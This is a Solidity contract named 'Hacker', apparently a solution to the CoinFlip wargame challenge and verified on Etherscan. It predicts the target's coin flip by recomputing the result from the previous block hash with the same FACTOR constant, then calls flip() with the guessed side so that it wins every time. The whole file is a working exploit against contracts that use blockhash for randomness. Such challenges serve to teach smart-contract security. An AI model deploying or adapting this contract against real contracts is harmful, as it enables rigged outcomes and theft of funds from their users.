/**
 *Submitted for verification at Etherscan.io on 2022-08-15
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Hacker {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(){
  }

  function predictFlips(address AddressToHack) external returns (bool){
    CoinFlip hackedInstance = CoinFlip(AddressToHack);
    
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

     lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;

    bool side = coinFlip == 1 ? true : false;
    return(hackedInstance.flip(side));
  }
}